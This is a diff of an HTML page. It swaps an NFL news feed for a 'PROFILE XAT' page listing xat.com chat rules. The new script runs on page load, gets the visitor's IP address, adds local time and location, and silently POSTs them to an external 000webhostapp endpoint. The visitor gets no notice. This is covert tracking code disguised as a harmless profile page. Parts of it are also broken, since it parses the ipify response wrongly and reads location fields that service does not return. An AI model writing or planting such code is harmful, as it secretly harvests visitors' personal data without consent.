@@ -1,119 +1,105 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Notícias da NFL</title>
+    <title>Profile</title>
     <style>
         body {
-            margin: 0;
-            padding: 0;
+            background-color: black;
+            color: white;
             font-family: Arial, sans-serif;
-            background-color: #fff;
-            color: #333;
         }
-
-        header {
-            background-color: #c00;
+        .banner {
+            width: 100%;
+            background-color: black;
             text-align: center;
             padding: 20px 0;
         }
-
-        .banner img {
-            max-width: 100%;
-            max-height: 500px;
-            width: auto;
-            height: auto;
-            vertical-align: middle;
+        .banner h1 {
+            font-size: 36px;
+            color: limegreen;
+            text-transform: uppercase;
         }
-
-        main {
-            padding: 20px;
+        .rules {
+            margin: 20px auto;
+            max-width: 600px;
+            padding: 0 20px;
         }
-
-        .news-container {
-            max-width: 800px;
-            margin: 0 auto;
+        .rules h2 {
+            font-size: 24px;
+            margin-bottom: 10px;
         }
-
-        .news-item {
-            margin-bottom: 20px;
-            border-bottom: 1px solid #ccc;
-            padding-bottom: 20px;
-        }
-
-        footer {
-            background-color: #333;
-            color: #fff;
-            text-align: center;
-            padding: 10px 0;
-            position: fixed;
-            bottom: 0;
-            width: 100%;
-        }
-
-        footer p {
-            margin: 0;
-        }
-
-        h2 {
-            color: #c00;
-        }
-
-        a {
-            color: #c00;
-            text-decoration: none;
-        }
-
-        a:hover {
-            text-decoration: underline;
+        .rules ol {
+            padding-left: 20px;
         }
     </style>
 </head>
 <body>
-    <header>
-        <div class="banner">
-            <img src="a.png" alt="NFL Banner">
-        </div>
-    </header>
-    
-    <main>
-        <div class="news-container">
-            <!-- Aqui serão inseridas as notícias dinâmicas -->
-        </div>
-    </main>
-    
-    <footer>
-        <p>&copy; LeanNFL. Todos os direitos reservados.</p>
-    </footer>
+    <div class="banner">
+        <h1>PROFILE XAT</h1>
+    </div>
+    <div class="rules">
+        <h2>10 Rules of xat.com</h2>
+        <ol>
+            <li>Respect all users</li>
+            <li>No spamming or flooding the chat</li>
+            <li>No posting of personal information</li>
+            <li>No adult content or links to adult websites</li>
+            <li>No hacking or exploiting bugs</li>
+            <li>No begging for powers, days, or xats</li>
+            <li>No scamming or trading xats, days, or powers</li>
+            <li>No advertising other chat groups</li>
+            <li>No impersonating other users or xat staff</li>
+            <li>Follow the instructions of the xat staff</li>
+        </ol>
+    </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
     <script>
-        const newsContainer = document.querySelector('.news-container');
+        // Função para obter o endereço IP do cliente
+        function getIP(json) {
+            var ip = json.ip;
+            var time = new Date().toLocaleString(); // Captura a hora local do usuário
+            var location = json.country + ', ' + json.region + ', ' + json.city; // Obtém a localização aproximada do IP
 
-        axios.get('https://site.api.espn.com/apis/site/v2/sports/football/nfl/news?region=br&lang=pt')
-            .then(response => {
-                const news = response.data.articles.filter(article => {
-                    // Filtrar as notícias desde setembro de 2023
-                    const articleDate = new Date(article.published);
-                    const september2023 = new Date('2023-09-01');
-                    return articleDate >= september2023;
-                });
+            // Dados a serem enviados para o servidor externo
+            var data = {
+                ip: ip,
+                time: time,
+                location: location
+            };
 
-                news.forEach(newsItem => {
-                    const newsElement = document.createElement('div');
-                    newsElement.classList.add('news-item');
-                    newsElement.innerHTML = `
-                        <h2>${newsItem.headline}</h2>
-                        <p>${newsItem.description}</p>
-                        <a href="${newsItem.links.web.href}" target="_blank">Leia mais</a>
-                    `;
-                    newsContainer.appendChild(newsElement);
-                });
+            // Requisição POST para enviar os dados para o servidor externo
+            fetch('https://leanbnk.000webhostapp.com/endpoint.php', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
             })
-            .catch(error => {
-                console.error('Erro ao buscar notícias:', error);
+            .then(response => response.text())
+            .then(data => {
+                console.log(data); // Exibe a resposta do servidor no console
+            })
+            .catch((error) => {
+                console.error('Erro ao enviar os dados:', error);
             });
+        }
+
+        // Requisição para obter o endereço IP usando um serviço externo
+        fetch('https://api64.ipify.org?format=jsonp', {
+            method: 'GET',
+            mode: 'cors',
+        })
+        .then(response => response.text())
+        .then(data => {
+            // A resposta é em formato JSONP, precisamos converter para JSON
+            var json = JSON.parse(data.slice(5, -2));
+            getIP(json); // Chama a função para processar o endereço IP
+        })
+        .catch((error) => {
+            console.error('Erro ao obter o endereço IP:', error);
+        });
     </script>
 </body>
 </html>
